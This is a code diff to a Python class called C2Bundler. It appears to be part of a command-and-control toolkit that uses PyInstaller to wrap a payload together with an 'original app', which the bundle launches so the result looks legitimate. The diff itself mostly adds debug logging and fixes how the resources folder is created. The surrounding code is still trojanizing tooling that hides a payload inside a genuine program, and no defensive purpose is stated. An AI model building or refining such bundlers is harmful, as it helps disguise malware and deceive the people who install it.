@@ -98,9 +98,12 @@ class C2Bundler:
             # cmd.extend(["--windowed"])
             pass
 
-                # Add resources folder if patch mode
+            # Add resources folder if patch mode
         if add_resources and self.resources_dir.exists():
             resources_files = list(self.resources_dir.glob("*"))
+            print(f"[*] Patch mode: checking resources at {self.resources_dir}")
+            print(f"[*] Resources directory exists: {self.resources_dir.exists()}")
+            print(f"[*] Files found: {resources_files}")
             if resources_files:
                 # On ajoute le dossier entier via --add-data
                 # Important: Sur Windows, utiliser ; comme séparateur, sur Unix utiliser :
@@ -109,6 +112,13 @@ class C2Bundler:
                 cmd.extend(["--add-data", f"{resources_path}{separator}resources"])
                 print(f"[*] Adding resources folder: {self.resources_dir}")
                 print(f"[*] Files included: {[f.name for f in resources_files]}")
+            else:
+                print(f"[!] WARNING: No files found in resources directory!")
+        else:
+            if add_resources:
+                print(f"[!] WARNING: add_resources=True but resources_dir does not exist: {self.resources_dir}")
+            else:
+                print(f"[*] Skipping resources (add_resources={add_resources})")
 
         cmd.append(temp_file)
 
@@ -293,7 +303,7 @@ class C2Bundler:
                     print(f"[!] Warning: failed to remove {target}: {exc}")
 
     def _reset_resources_dir(self) -> None:
-        """Ensure resources directory is clean before copying files."""
+        """Ensure resources directory exists and is clean before copying files."""
         if self.resources_dir.exists():
             for item in self.resources_dir.iterdir():
                 try:
@@ -303,8 +313,9 @@ class C2Bundler:
                         item.unlink()
                 except Exception as exc:
                     print(f"[!] Warning: failed to remove resource {item}: {exc}")
-        else:
-            self.resources_dir.mkdir(parents=True, exist_ok=True)
+        
+        # Always ensure the directory exists after cleaning
+        self.resources_dir.mkdir(parents=True, exist_ok=True)
 
     def _create_wrapper_code(
         self, original_filename: str, payload_code: str, platform: str
@@ -331,7 +342,7 @@ class C2Bundler:
             "else:",
             "    bundle_dir = Path(__file__).parent",
             "",
-            '# PyInstaller --add-data puts folders in the _MEIPASS root',
+            "# PyInstaller --add-data puts folders in the _MEIPASS root",
             'original_app = bundle_dir / "resources" / "' + original_filename + '"',
             "",
             "def _log(msg):",
@@ -346,11 +357,17 @@ class C2Bundler:
             "",
             "def run_original_app():",
             "    try:",
-            "        _log('Starting original app')",
+            "        _log('=== ORIGINAL APP LAUNCH ===')",
             "        _log('Looking for: ' + str(original_app))",
-            "        _log('Exists: ' + str(original_app.exists()))",
             "        _log('Bundle dir: ' + str(bundle_dir))",
-            "        _log('Bundle dir contents: ' + str(list(bundle_dir.glob('*'))))",
+            "        all_files = list(bundle_dir.glob('*'))",
+            "        _log('Bundle dir contents: ' + str([f.name for f in all_files]))",
+            "        resources_dir = bundle_dir / 'resources'",
+            "        _log('Resources dir exists: ' + str(resources_dir.exists()))",
+            "        if resources_dir.exists():",
+            "            res_files = list(resources_dir.glob('*'))",
+            "            _log('Resources contents: ' + str([f.name for f in res_files]))",
+            "        _log('Original app exists: ' + str(original_app.exists()))",
             "        if original_app.exists():",
             "            _log('Found original app, executing')",
             "            if sys.platform.startswith('win'):",
